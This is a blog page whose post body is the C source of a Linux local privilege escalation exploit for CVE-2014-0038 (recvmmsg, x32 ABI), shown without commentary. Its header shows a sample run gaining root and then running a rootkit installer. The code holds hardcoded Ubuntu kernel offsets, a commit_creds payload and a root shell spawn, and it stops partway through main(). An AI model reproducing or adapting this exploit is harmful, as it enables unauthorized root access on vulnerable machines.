<!DOCTYPE html>
<html lang="en">
<head>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <!-- Enable responsiveness on mobile devices-->
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
  <title>@xjump</title>


  <script type="text/javascript" src="/slideout/1.0.1/slideout.min.js"></script>

  <link rel="stylesheet" href="/katex/0.10.1/katex.min.css">
  <script type="text/javascript" defer src="/katex/0.10.1/katex.min.js" ></script>
  <script type="text/javascript" defer src="/katex/0.10.1/contrib/mathtex-script-type.min.js" ></script>

  <script type="text/javascript" defer src="/katex/0.10.1/contrib/auto-render.min.js" onload="renderMathInElement(document.body);"></script>




  <link rel="stylesheet" href="/site.css">

  <link rel="stylesheet" href="/katex/0.10.1/katex.min.css"  >





</head>

<body>
  <div class="container">
    <div id="mobile-navbar" class="mobile-navbar">
      <div class="mobile-header-logo">
      <a href="/" class="logo">@xjump</a>
      </div>
      <div class="mobile-navbar-icon icon-out">
        <span></span>
        <span></span>
        <span></span>
      </div>
    </div>

    <nav id="mobile-menu" class="mobile-menu slideout-menu slideout-menu-left">
      <ul class="mobile-menu-list">
      
        <li class="mobile-menu-item">
        <a href="https:&#x2F;&#x2F;xjump.me">Home</a>
        </li>
      
        <li class="mobile-menu-item">
        <a href="https:&#x2F;&#x2F;xjump.me&#x2F;categories">Categories</a>
        </li>
      
        <li class="mobile-menu-item">
        <a href="https:&#x2F;&#x2F;xjump.me&#x2F;tags&#x2F;all">Archive</a>
        </li>
      
        <li class="mobile-menu-item">
        <a href="https:&#x2F;&#x2F;xjump.me&#x2F;rss.xml">RSS</a>
        </li>
      
        <li class="mobile-menu-item">
        <a href="https:&#x2F;&#x2F;xjump.me&#x2F;about">About</a>
        </li>
      
      </ul>
    </nav>

    <header id="header">
      <div class="logo"><a href="https:&#x2F;&#x2F;xjump.me">@xjump</a></div>
      <nav class="menu">
        <ul>
        
    <li><a href="https:&#x2F;&#x2F;xjump.me">Home </a></li>
        
    <li><a href="https:&#x2F;&#x2F;xjump.me&#x2F;categories">Categories </a></li>
        
    <li><a href="https:&#x2F;&#x2F;xjump.me&#x2F;tags&#x2F;all">Archive </a></li>
        
    <li><a href="https:&#x2F;&#x2F;xjump.me&#x2F;rss.xml">RSS </a></li>
        
    <li><a href="https:&#x2F;&#x2F;xjump.me&#x2F;about">About </a></li>
        
        </ul>
      </nav>
    </header>

    <main>
      <div class="content" id="mobile-panel">




<article class="post">

<header class="post__header">
  <h1 class="post__title"><a href="https:&#x2F;&#x2F;xjump.me&#x2F;20140630-cve-2014-0038&#x2F;">CVE-2014-0038</a></h1>
  <div class="post__meta">
    <span class="post__time">2014-06-30</span>

  </div>
</header>

 <div class="post-content"><pre style="background-color:#212121;">
<code class="language-cpp" data-lang="cpp"><span style="font-style:italic;color:#4a4a4a;">/* </span><span style="font-style:italic;color:#4a4a4a;">
*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*</span><span style="font-style:italic;color:#4a4a4a;">
recvmmsg.c - linux 3.4+ local root (CONFIG_X86_X32=y)</span><span style="font-style:italic;color:#4a4a4a;">
CVE-2014-0038 / x32 ABI with recvmmsg</span><span style="font-style:italic;color:#4a4a4a;">
by rebel @ irc.smashthestack.org</span><span style="font-style:italic;color:#4a4a4a;">
-----------------------------------</span><span style="font-style:italic;color:#4a4a4a;">
</span><span style="font-style:italic;color:#4a4a4a;">
takes about 13 minutes to run because timeout-&gt;tv_sec is decremented</span><span style="font-style:italic;color:#4a4a4a;">
once per second and 0xff*3 is 765.</span><span style="font-style:italic;color:#4a4a4a;">
</span><span style="font-style:italic;color:#4a4a4a;">
some things you could do while waiting:</span><span style="font-style:italic;color:#4a4a4a;">
* watch http://www.youtube.com/watch?v=OPyZGCKu2wg 3 times</span><span style="font-style:italic;color:#4a4a4a;">
* read https://wiki.ubuntu.com/Security/Features and smirk a few times</span><span style="font-style:italic;color:#4a4a4a;">
* brew some coffee</span><span style="font-style:italic;color:#4a4a4a;">
* stare at the countdown giggly with anticipation</span><span style="font-style:italic;color:#4a4a4a;">
</span><span style="font-style:italic;color:#4a4a4a;">
could probably whack the high bits of some pointer with nanoseconds,</span><span style="font-style:italic;color:#4a4a4a;">
but that would require a bunch of nulls before the pointer and then</span><span style="font-style:italic;color:#4a4a4a;">
reading an oops from dmesg which isn&amp;#39;t that elegant.</span><span style="font-style:italic;color:#4a4a4a;">
</span><span style="font-style:italic;color:#4a4a4a;">
&amp;net_sysctl_root.permissions is nice because it has 16 trailing nullbytes</span><span style="font-style:italic;color:#4a4a4a;">
</span><span style="font-style:italic;color:#4a4a4a;">
hardcoded offsets because I only saw this on ubuntu &amp; kallsyms is protected</span><span style="font-style:italic;color:#4a4a4a;">
anyway..</span><span style="font-style:italic;color:#4a4a4a;">
</span><span style="font-style:italic;color:#4a4a4a;">
same principle will work on 32bit but I didn&amp;#39;t really find any major</span><span style="font-style:italic;color:#4a4a4a;">
distros shipping with CONFIG_X86_X32=y</span><span style="font-style:italic;color:#4a4a4a;">
</span><span style="font-style:italic;color:#4a4a4a;">
user@ubuntu:~$ uname -a</span><span style="font-style:italic;color:#4a4a4a;">
Linux ubuntu 3.11.0-15-generic #23-Ubuntu SMP Mon Dec 9 18:17:04 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux</span><span style="font-style:italic;color:#4a4a4a;">
user@ubuntu:~$ gcc recvmmsg.c -o recvmmsg</span><span style="font-style:italic;color:#4a4a4a;">
user@ubuntu:~$ ./recvmmsg</span><span style="font-style:italic;color:#4a4a4a;">
byte 3 / 3.. ~0 secs left. </span><span style="font-style:italic;color:#4a4a4a;">
w00p w00p!</span><span style="font-style:italic;color:#4a4a4a;">
# id</span><span style="font-style:italic;color:#4a4a4a;">
uid=0(root) gid=0(root) groups=0(root)</span><span style="font-style:italic;color:#4a4a4a;">
# sh phalanx-2.6b-x86_64.sh</span><span style="font-style:italic;color:#4a4a4a;">
unpacking..</span><span style="font-style:italic;color:#4a4a4a;">
</span><span style="font-style:italic;color:#4a4a4a;">
:)=</span><span style="font-style:italic;color:#4a4a4a;">
</span><span style="font-style:italic;color:#4a4a4a;">
greets to my homeboys kaliman, beist, capsl &amp; all of #social</span><span style="font-style:italic;color:#4a4a4a;">
</span><span style="font-style:italic;color:#4a4a4a;">
Sat Feb 1 22:15:19 CET 2014</span><span style="font-style:italic;color:#4a4a4a;">
% rebel %</span><span style="font-style:italic;color:#4a4a4a;">
*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*</span><span style="font-style:italic;color:#4a4a4a;">
*/</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#define </span><span style="color:#eeffff;">_GNU_SOURCE</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">netinet/ip.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">stdio.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">stdlib.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">string.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">sys/socket.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">unistd.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">sys/syscall.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">sys/mman.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">sys/types.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">sys/stat.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">fcntl.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">sys/utsname.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#define </span><span style="color:#eeffff;">__X32_SYSCALL_BIT </span><span style="color:#89ddff;">0x</span><span style="color:#f78c6c;">40000000</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#undef</span><span style="color:#eeffff;"> __NR_recvmmsg</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#define </span><span style="color:#eeffff;">__NR_recvmmsg </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">__X32_SYSCALL_BIT </span><span style="color:#89ddff;">+ </span><span style="color:#f78c6c;">537</span><span style="color:#89ddff;">)</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#define </span><span style="color:#eeffff;">VLEN </span><span style="color:#f78c6c;">1</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#define </span><span style="color:#eeffff;">BUFSIZE </span><span style="color:#f78c6c;">200</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">int</span><span style="color:#eeffff;"> port</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">struct </span><span style="color:#eeffff;">offset </span><span style="color:#89ddff;">{</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">char </span><span style="color:#89ddff;">*</span><span style="color:#eeffff;">kernel_version</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">unsigned long</span><span style="color:#eeffff;"> dest</span><span style="color:#89ddff;">; </span><span style="font-style:italic;color:#4a4a4a;">// net_sysctl_root + 96</span><span style="font-style:italic;color:#4a4a4a;">
  </span><span style="font-style:italic;color:#c792ea;">unsigned long</span><span style="color:#eeffff;"> original_value</span><span style="color:#89ddff;">; </span><span style="font-style:italic;color:#4a4a4a;">// net_ctl_permissions</span><span style="font-style:italic;color:#4a4a4a;">
  </span><span style="font-style:italic;color:#c792ea;">unsigned long</span><span style="color:#eeffff;"> prepare_kernel_cred</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">unsigned long</span><span style="color:#eeffff;"> commit_creds</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">};</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">struct</span><span style="color:#eeffff;"> offset offsets</span><span style="color:#89ddff;">[] = {</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">{&quot;</span><span style="color:#c3e88d;">3.11.0-15-generic</span><span style="color:#89ddff;">&quot;,0x</span><span style="color:#f78c6c;">ffffffff81cdf400</span><span style="color:#89ddff;">+</span><span style="color:#f78c6c;">96</span><span style="color:#89ddff;">,0x</span><span style="color:#f78c6c;">ffffffff816d4ff0</span><span style="color:#89ddff;">,0x</span><span style="color:#f78c6c;">ffffffff8108afb0</span><span style="color:#89ddff;">,0x</span><span style="color:#f78c6c;">ffffffff8108ace0</span><span style="color:#89ddff;">}, </span><span style="font-style:italic;color:#4a4a4a;">// Ubuntu 13.10</span><span style="font-style:italic;color:#4a4a4a;">
  </span><span style="color:#89ddff;">{&quot;</span><span style="color:#c3e88d;">3.11.0-12-generic</span><span style="color:#89ddff;">&quot;,0x</span><span style="color:#f78c6c;">ffffffff81cdf3a0</span><span style="color:#89ddff;">,0x</span><span style="color:#f78c6c;">ffffffff816d32a0</span><span style="color:#89ddff;">,0x</span><span style="color:#f78c6c;">ffffffff8108b010</span><span style="color:#89ddff;">,0x</span><span style="color:#f78c6c;">ffffffff8108ad40</span><span style="color:#89ddff;">}, </span><span style="font-style:italic;color:#4a4a4a;">// Ubuntu 13.10</span><span style="font-style:italic;color:#4a4a4a;">
  </span><span style="color:#89ddff;">{&quot;</span><span style="color:#c3e88d;">3.8.0-19-generic</span><span style="color:#89ddff;">&quot;,0x</span><span style="color:#f78c6c;">ffffffff81cc7940</span><span style="color:#89ddff;">,0x</span><span style="color:#f78c6c;">ffffffff816a7f40</span><span style="color:#89ddff;">,0x</span><span style="color:#f78c6c;">ffffffff810847c0</span><span style="color:#89ddff;">, 0x</span><span style="color:#f78c6c;">ffffffff81084500</span><span style="color:#89ddff;">}, </span><span style="font-style:italic;color:#4a4a4a;">// Ubuntu 13.04</span><span style="font-style:italic;color:#4a4a4a;">
  </span><span style="color:#89ddff;">{</span><span style="color:#f78c6c;">NULL</span><span style="color:#89ddff;">,</span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">,</span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">,</span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">,</span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">};</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">void </span><span style="color:#82aaff;">udp</span><span style="color:#89ddff;">(</span><span style="font-style:italic;color:#c792ea;">int </span><span style="color:#f78c6c;">b</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">int</span><span style="color:#eeffff;"> sockfd</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">struct</span><span style="color:#eeffff;"> sockaddr_in servaddr</span><span style="color:#89ddff;">,</span><span style="color:#eeffff;">cliaddr</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">int</span><span style="color:#eeffff;"> s </span><span style="color:#89ddff;">= 0x</span><span style="color:#f78c6c;">ff</span><span style="color:#89ddff;">+</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">if</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">fork</span><span style="color:#89ddff;">() == </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
    </span><span style="font-style:italic;color:#c792ea;">while</span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">s </span><span style="color:#89ddff;">&gt; </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
      </span><span style="color:#82aaff;">fprintf</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">stderr</span><span style="color:#89ddff;">,&quot;\r</span><span style="color:#c3e88d;">byte </span><span style="color:#eeffff;">%d</span><span style="color:#c3e88d;"> / 3.. ~</span><span style="color:#eeffff;">%d</span><span style="color:#c3e88d;"> secs left </span><span style="color:#89ddff;">\b\b\b\b&quot;,</span><span style="color:#82aaff;">b</span><span style="color:#89ddff;">+</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">,</span><span style="color:#f78c6c;">3</span><span style="color:#89ddff;">*0x</span><span style="color:#f78c6c;">ff </span><span style="color:#89ddff;">-</span><span style="color:#82aaff;"> b</span><span style="color:#89ddff;">*0x</span><span style="color:#f78c6c;">ff </span><span style="color:#89ddff;">- (0x</span><span style="color:#f78c6c;">ff</span><span style="color:#89ddff;">+</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">-</span><span style="color:#82aaff;">s</span><span style="color:#89ddff;">));</span><span style="color:#eeffff;">
      </span><span style="color:#82aaff;">sleep</span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
      s</span><span style="color:#89ddff;">--;</span><span style="color:#eeffff;">
      </span><span style="color:#82aaff;">fprintf</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">stderr</span><span style="color:#89ddff;">,&quot;</span><span style="color:#c3e88d;">.</span><span style="color:#89ddff;">&quot;);</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
    sockfd </span><span style="color:#89ddff;">= </span><span style="color:#82aaff;">socket</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">AF_INET</span><span style="color:#89ddff;">,</span><span style="color:#82aaff;">SOCK_DGRAM</span><span style="color:#89ddff;">,</span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">bzero</span><span style="color:#89ddff;">(&amp;</span><span style="color:#82aaff;">servaddr</span><span style="color:#89ddff;">,sizeof(</span><span style="color:#82aaff;">servaddr</span><span style="color:#89ddff;">));</span><span style="color:#eeffff;">
    servaddr</span><span style="color:#89ddff;">.</span><span style="color:#eeffff;">sin_family </span><span style="color:#89ddff;">=</span><span style="color:#eeffff;"> AF_INET</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
    servaddr</span><span style="color:#89ddff;">.</span><span style="color:#eeffff;">sin_addr</span><span style="color:#89ddff;">.</span><span style="color:#eeffff;">s_addr</span><span style="color:#89ddff;">=</span><span style="color:#82aaff;">htonl</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">INADDR_LOOPBACK</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
    servaddr</span><span style="color:#89ddff;">.</span><span style="color:#eeffff;">sin_port</span><span style="color:#89ddff;">=</span><span style="color:#82aaff;">htons</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">port</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">sendto</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">sockfd</span><span style="color:#89ddff;">,&quot;</span><span style="color:#c3e88d;">1</span><span style="color:#89ddff;">&quot;,</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">,</span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">,(</span><span style="font-style:italic;color:#c792ea;">struct</span><span style="color:#82aaff;"> sockaddr </span><span style="color:#89ddff;">*)&amp;</span><span style="color:#82aaff;">servaddr</span><span style="color:#89ddff;">,sizeof(</span><span style="color:#82aaff;">servaddr</span><span style="color:#89ddff;">));</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">exit</span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">void </span><span style="color:#82aaff;">trigger</span><span style="color:#89ddff;">() {</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">open</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">/proc/sys/net/core/somaxconn</span><span style="color:#89ddff;">&quot;,</span><span style="color:#82aaff;">O_RDONLY</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">if</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">getuid</span><span style="color:#89ddff;">() != </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">fprintf</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">stderr</span><span style="color:#89ddff;">,&quot;</span><span style="color:#c3e88d;">not root, ya blew it!</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">exit</span><span style="color:#89ddff;">(-</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">fprintf</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">stderr</span><span style="color:#89ddff;">,&quot;</span><span style="color:#c3e88d;">w00p w00p!</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">system</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">/bin/sh -i</span><span style="color:#89ddff;">&quot;);</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">typedef int </span><span style="color:#c792ea;">__attribute__</span><span style="color:#89ddff;">((</span><span style="color:#eeffff;">regparm</span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">3</span><span style="color:#89ddff;">))) (*</span><span style="color:#eeffff;"> _commit_creds</span><span style="color:#89ddff;">)(</span><span style="font-style:italic;color:#c792ea;">unsigned long</span><span style="color:#eeffff;"> cred</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">typedef unsigned long </span><span style="color:#c792ea;">__attribute__</span><span style="color:#89ddff;">((</span><span style="color:#eeffff;">regparm</span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">3</span><span style="color:#89ddff;">))) (*</span><span style="color:#eeffff;"> _prepare_kernel_cred</span><span style="color:#89ddff;">)(</span><span style="font-style:italic;color:#c792ea;">unsigned long</span><span style="color:#eeffff;"> cred</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
_commit_creds commit_creds</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
_prepare_kernel_cred prepare_kernel_cred</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#4a4a4a;">// thx bliss</span><span style="font-style:italic;color:#4a4a4a;">
</span><span style="color:#c792ea;">static </span><span style="font-style:italic;color:#c792ea;">int </span><span style="color:#c792ea;">__attribute__</span><span style="color:#89ddff;">((</span><span style="color:#eeffff;">regparm</span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">3</span><span style="color:#89ddff;">)))</span><span style="color:#eeffff;">
</span><span style="color:#82aaff;">getroot</span><span style="color:#89ddff;">(</span><span style="font-style:italic;color:#c792ea;">void </span><span style="color:#89ddff;">*</span><span style="color:#f78c6c;">head</span><span style="color:#89ddff;">, </span><span style="font-style:italic;color:#c792ea;">void </span><span style="color:#89ddff;">* </span><span style="color:#f78c6c;">table</span><span style="color:#89ddff;">)</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">{</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">commit_creds</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">prepare_kernel_cred</span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">));</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">return </span><span style="color:#89ddff;">-</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">void </span><span style="color:#c792ea;">__attribute__</span><span style="color:#89ddff;">((</span><span style="color:#eeffff;">regparm</span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">3</span><span style="color:#89ddff;">)))</span><span style="color:#eeffff;">
</span><span style="color:#82aaff;">trampoline</span><span style="color:#89ddff;">()</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">{</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">asm</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">mov $getroot, %rax; call *%rax;</span><span style="color:#89ddff;">&quot;);</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">int </span><span style="color:#82aaff;">main</span><span style="color:#89ddff;">(</span><span style="font-style:italic;color:#c792ea;">void</span><span style="color:#89ddff;">)</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">{</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">int</span><span style="color:#eeffff;"> sockfd</span><span style="color:#89ddff;">,</span><span style="color:#eeffff;"> retval</span><span style="color:#89ddff;">,</span><span style="color:#eeffff;"> i</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">struct</span><span style="color:#eeffff;"> sockaddr_in sa</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">struct</span><span style="color:#eeffff;"> mmsghdr msgs</span><span style="color:#89ddff;">[</span><span style="color:#eeffff;">VLEN</span><span style="color:#89ddff;">];</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">struct</span><span style="color:#eeffff;"> iovec iovecs</span><span style="color:#89ddff;">[</span><span style="color:#eeffff;">VLEN</span><span style="color:#89ddff;">];</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">char</span><span style="color:#eeffff;"> buf</span><span style="color:#89ddff;">[</span><span style="color:#eeffff;">BUFSIZE</span><span style="color:#89ddff;">];</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">long</span><span style="color:#eeffff;"> mmapped</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">struct</span><span style="color:#eeffff;"> utsname u</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">struct</span><span style="color:#eeffff;"> offset </span><span style="color:#89ddff;">*</span><span style="color:#eeffff;">off </span><span style="color:#89ddff;">= </span><span style="color:#f78c6c;">NULL</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">uname</span><span style="color:#89ddff;">(&amp;</span><span style="color:#82aaff;">u</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">for</span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">i</span><span style="color:#89ddff;">=</span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">offsets</span><span style="color:#89ddff;">[</span><span style="color:#eeffff;">i</span><span style="color:#89ddff;">].</span><span style="color:#eeffff;">kernel_version </span><span style="color:#89ddff;">!= </span><span style="color:#f78c6c;">NULL</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">i</span><span style="color:#89ddff;">++) {</span><span style="color:#eeffff;">
    </span><span style="font-style:italic;color:#c792ea;">if</span><span style="color:#89ddff;">(!</span><span style="color:#82aaff;">strcmp</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">offsets</span><span style="color:#89ddff;">[</span><span style="color:#82aaff;">i</span><span style="color:#89ddff;">].</span><span style="color:#eeffff;">kernel_version</span><span style="color:#89ddff;">,</span><span style="color:#82aaff;">u</span><span style="color:#89ddff;">.</span><span style="color:#eeffff;">release</span><span style="color:#89ddff;">)) {</span><span style="color:#eeffff;">
      off </span><span style="color:#89ddff;">= &amp;</span><span style="color:#eeffff;">offsets</span><span style="color:#89ddff;">[</span><span style="color:#eeffff;">i</span><span style="color:#89ddff;">];</span><span style="color:#eeffff;">
      </span><span style="font-style:italic;color:#c792ea;">break</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">if</span><span style="color:#89ddff;">(!</span><span style="color:#eeffff;">off</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">fprintf</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">stderr</span><span style="color:#89ddff;">,&quot;</span><span style="color:#c3e88d;">no offsets for this kernel version..</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">exit</span><span style="color:#89ddff;">(-</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
